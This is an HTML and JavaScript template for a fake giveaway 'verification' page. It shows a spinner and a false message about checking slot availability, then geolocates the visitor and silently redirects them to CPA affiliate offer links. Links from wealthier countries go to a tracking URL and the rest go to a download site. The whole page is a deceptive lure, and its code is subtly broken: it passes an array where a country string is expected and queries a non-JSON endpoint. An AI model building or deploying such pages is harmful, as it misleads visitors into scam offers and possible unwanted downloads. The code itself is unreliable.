<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verifying Entry...</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
            background-color: #ffffff;
            color: #1a1a1a;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            text-align: center;
            max-width: 350px;
            padding: 20px;
        }
        .spinner {
            border: 3px solid #f3f3f3;
            width: 36px;
            height: 36px;
            border-radius: 50%;
            border-left-color: #2563eb;
            animation: spin 0.8s linear infinite;
            margin: 0 auto 20px auto;
        }
        .status-text {
            font-size: 16px;
            font-weight: 500;
            margin-bottom: 8px;
        }
        .sub-text {
            font-size: 13px;
            color: #666666;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <div class="container">
        <div class="spinner"></div>
        <div class="status-text">Verifying giveaway entry...</div>
        <div class="sub-text">Please wait while we check slot availability in your country.</div>
        <a id="fallback-button" href="https://your-cpagrip-smartlink.com" style="display:none;">Click Here</a>
    </div>

    <script>
        // ==========================================
        // PASTE YOUR ACTUAL LINKS BETWEEN THE QUOTES
        // ==========================================
        const TIER_1_URL = "https://trkoffer.net/sl/06828"; 
        const REST_OF_WORLD_URL = "https://playabledownloads.com/EnterHere";

        const topTier1Countries = ['US', 'GB', 'CA', 'AU', 'DE', 'FR', 'NZ', 'IE', 'CH', 'NO', 'SE', 'DK'];
        document.getElementById('fallback-button').href = REST_OF_WORLD_URL;

        function runRedirect(countryCode) {
            const cleanCode = countryCode ? countryCode.toUpperCase() : '';
            if (topTier1Countries.includes(cleanCode)) {
                window.location.href = TIER_1_URL;
            } else {
                window.location.href = REST_OF_WORLD_URL;
            }
        }

        fetch('/cdn-cgi/trace')
            .then(res => res.text())
            .then(text => {
                const lines = text.split('\n');
                const locLine = lines.find(line => line.startsWith('loc='));
                if (locLine) {
                    const country = locLine.split('=');
                    runRedirect(country);
                } else {
                    throw new Error();
                }
            })
            .catch(() => {
                fetch('https://ipapi.co')
                    .then(res => res.json())
                    .then(data => runRedirect(data.country_code))
                    .catch(() => {
                        runRedirect('');
                    });
            });
    </script>

</body>
</html>
